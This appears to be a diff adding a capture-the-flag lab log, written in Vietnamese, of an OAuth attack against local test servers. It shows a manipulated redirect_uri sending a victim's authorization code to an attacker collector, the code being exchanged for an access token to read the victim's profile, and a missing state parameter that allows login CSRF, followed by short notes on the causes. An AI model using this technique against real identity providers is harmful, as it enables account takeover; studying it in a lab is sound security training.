@@ -1,0 +1,28 @@
+$ python3 provider.py            # terminal 1, IdP  :8044
+$ python3 client.py              # terminal 2, client/relying party :8045
+$ python3 attacker_collector.py  # terminal 3, server attacker :8049
+
+$ python3 exploit.py             # terminal 4
+[*] Man 0: luong SSO binh thuong
+    authorize -> 302 http://localhost:8045/callback?code=04bc79a8d6d8982b
+    client /callback -> {'email': 'carol@corp.local', 'logged_in_as': 'carol', 'note': 'client khong kiem state -> code nao cung nhan', 'ok': True, 'state_seen': ''}
+
+[*] Man 1: tan cong redirect_uri long leo -> cuop code
+    attacker gui victim link authorize voi redirect_uri=http://localhost:8049/collect
+    provider 302 ve server attacker: http://localhost:8049/collect?code=09c5c9ca2642c16c
+    [+] server attacker bat duoc code: 09c5c9ca2642c16c
+    doi code -> access_token: 785933614a515f51d5231006
+    [+] /userinfo cua VICTIM: {'email': 'carol@corp.local', 'flag': 'FLAG{4.4_oauth_code_theft}', 'ok': True, 'user': 'carol'}
+
+[*] Man 2: client thieu state (login CSRF)
+    client /login -> authorize: http://localhost:8044/authorize?response_type=code&client_id=portal&redirect_uri=http://localhost:8045/callback
+    co tham so 'state' khong? KHONG -> thieu chong CSRF
+    /callback nhan code KHONG kem state -> True
+
+=== KET QUA ===
+  Chiem tai khoan victim (carol) qua code theft. flag=FLAG{4.4_oauth_code_theft}
+
+# Provider khong kiem redirect_uri theo allowlist nen code cua carol chay thang ve
+# server attacker (:8049). Attacker doi code lay access_token roi doc /userinfo cua carol.
+# Code nam trong query string -> cung de ro ri qua Referer/history/log. Client lai
+# khong co state nen khong chong duoc CSRF luong dang nhap.
